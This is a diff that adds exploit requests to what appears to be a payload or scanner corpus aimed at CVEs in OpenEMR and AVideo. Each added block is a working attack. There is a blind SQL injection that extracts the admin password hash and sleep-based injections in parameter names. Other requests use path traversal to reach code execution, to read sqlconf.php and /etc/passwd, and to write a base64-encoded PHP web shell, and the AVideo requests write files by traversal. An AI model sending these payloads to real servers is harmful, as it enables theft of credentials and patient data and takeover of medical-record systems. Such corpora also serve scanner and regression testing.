@@ -5256,3 +5256,33 @@ POST /api/sessions header="Content-Type: application/json" body="{\"path\":\"/et
 GET /apps/queues
 GET /apps/queues/overview
 POST /api/users header="Content-Type: application/json" body="{\"image\":\"DATA:,/app/storage/settings.yml\"}"
+
+# --- CVE-2026-124469 (OpenEMR): the Fee Sheet product line interpolates
+#     prod[N][warehouse] into an ORDER BY, so a constant subquery is a blind
+#     timing oracle and information_schema reaches the exfiltration path. ---
+POST /interface/forms/fee_sheet/new.php header="Content-Type: application/x-www-form-urlencoded" body="prod[0][drug_id]=4&prod[0][warehouse]=1%27%2C(SELECT%20IF((SELECT%20ascii(substr(password%2C1%2C1))%20FROM%20users_secure%20WHERE%20username%3D0x61646d696e)%3D36%2C(SELECT%20COUNT(*)%20FROM%20information_schema.columns%20A%2C%20information_schema.columns%20B)%2C0))--%20-&bn_save=Save"
+
+# --- CVE-2026-124468 (OpenEMR): the Standard REST API uses query parameter
+#     names as SQL column identifiers in the insurance and employer search. ---
+GET /apis/default/api/patient/abc123/insurance?%28select%28sleep%285%29%29%29=1
+GET /apis/default/api/patient/abc123/employer?%28select%28sleep%285%29%29%29=1
+
+# --- CVE-2026-124467 (OpenEMR): the ESign router appends the raw module
+#     parameter to require_once, so traversal reaches an uploaded Controller.php. ---
+GET /interface/esign/index.php?module=../../../../../../../../../../tmp/send&c=id
+
+# --- CVE-2026-124457 (OpenEMR): sl_eob_process.php concatenates eraname into
+#     the ERA report and .edi paths without path containment. ---
+GET /interface/billing/sl_eob_process.php?csrf_token_form=x&paydate=2026-01-01&eraname=../../../../../../../../../tmp/EVIL_TRAV
+
+# --- CVE-2026-124450 / CVE-2026-124446 / CVE-2026-124490 (OpenEMR fax/SMS):
+#     disposeDocument trusts file_path for reads and writes, including
+#     sqlconf.php, /etc/passwd, and any writable target reached by traversal. ---
+GET /interface/modules/custom_modules/oe-module-faxsms/index.php?type=fax&_ACTION_COMMAND=fax/disposeDocument&action=download&file_path=/var/www/localhost/htdocs/openemr/sites/default/sqlconf.php&csrf_token_form=x
+GET /interface/modules/custom_modules/oe-module-faxsms/index.php?type=fax&_ACTION_COMMAND=fax/disposeDocument&action=download&file_path=/etc/passwd&csrf_token_form=x
+POST /interface/modules/custom_modules/oe-module-faxsms/index.php?type=fax&_ACTION_COMMAND=fax/disposeDocument header="Content-Type: application/x-www-form-urlencoded" body="action=setup&file_path=../../../../var/www/html/shell.php&content=PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA%2FPg%3D%3D&csrf_token_form=x"
+
+# --- CVE-2026-124424 (AVideo): the AI translation callback writes the VTT file
+#     to a path built from response[lang] without sanitizing traversal. ---
+POST /plugin/AI/receiveAsync.json.php header="Content-Type: application/x-www-form-urlencoded" body="type=translation&token=probe&response%5Bvtt%5D=POC-CONTROL-15&response%5Blang%5D=/../../../PoC-15-traversal&response%5Btext%5D=c&response%5Btotal_price%5D=0"
+POST /plugin/AI/receiveAsync.json.php header="Content-Type: application/x-www-form-urlencoded" body="type=translation&token=probe&response%5Bvtt%5D=POC-CONTROL-15&response%5Blang%5D=/../../../../../../../tmp/PoC-15-abs&response%5Btext%5D=c&response%5Btotal_price%5D=0"
